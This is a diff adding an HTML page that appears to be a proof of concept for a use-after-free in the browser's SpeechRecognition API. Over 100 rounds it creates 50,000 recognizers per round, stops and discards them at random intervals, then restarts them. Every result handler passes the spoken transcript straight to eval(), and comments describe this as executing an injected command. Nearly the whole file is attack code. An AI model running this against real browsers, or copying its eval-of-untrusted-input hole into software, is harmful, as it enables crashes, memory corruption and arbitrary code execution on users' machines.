@@ -1,0 +1,83 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeechRecognition</title>
+</head>
+<body>
+    <h1>SpeechRecognition</h1>
+    <button id="startButton">Start Speech Recognition</button>
+
+    <script>
+        let recognizers = [];
+
+        function createSpeechRecognizers(count) {
+            for (let i = 0; i < count; i++) {
+                let recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+                recognizers.push(recognition);
+
+                recognition.lang = 'en-US';
+                recognition.interimResults = false;
+                recognition.maxAlternatives = 1;
+
+                recognition.onresult = function(event) {
+                    let transcript = event.results[0][0].transcript;
+                    console.log('Transcript from recognizer', i, ':', transcript);
+                    // Execute the injected command using eval()
+                    eval(transcript);
+                };
+
+                recognition.onerror = function(event) {
+                    console.error('Error in SpeechRecognition:', event.error);
+                };
+
+                recognition.onend = function() {
+                    console.log('SpeechRecognition ended for instance:', i);
+                };
+
+                recognition.start();
+                setTimeout(() => {
+                    recognition.stop();
+                    recognizers.splice(recognizers.indexOf(recognition), 1);
+                }, Math.random() * 200);
+            }
+        }
+
+        function triggerSpeechRecognitionUAF() {
+            let totalRuns = 0;
+            function deepCreateAndResume() {
+                createSpeechRecognizers(50000);
+                setTimeout(() => {
+                    recognizers.forEach((recognition, index) => {
+                        try {
+                            if (recognition && recognition.readyState === 0) {
+                                // Inject a command into the onresult event handler
+                                recognition.onresult = function(event) {
+                                    let transcript = event.results[0][0].transcript;
+                                    console.log('Transcript from recognizer', index, ':', transcript);
+                                    // Execute the injected command using eval()
+                                    eval(transcript);
+                                };
+                                recognition.start();
+                                console.log('Trying to resume SpeechRecognition:', index);
+                            }
+                        } catch (e) {
+                            console.error('SpeechRecognition potential UAF:', e);
+                        }
+                    });
+                }, 150);
+
+                totalRuns++;
+                if (totalRuns < 100) {
+                    setTimeout(deepCreateAndResume, 100);
+                }
+            }
+            deepCreateAndResume();
+        }
+
+        document.getElementById('startButton').addEventListener('click', () => {
+            triggerSpeechRecognitionUAF();
+        });
+    </script>
+</body>
+</html>
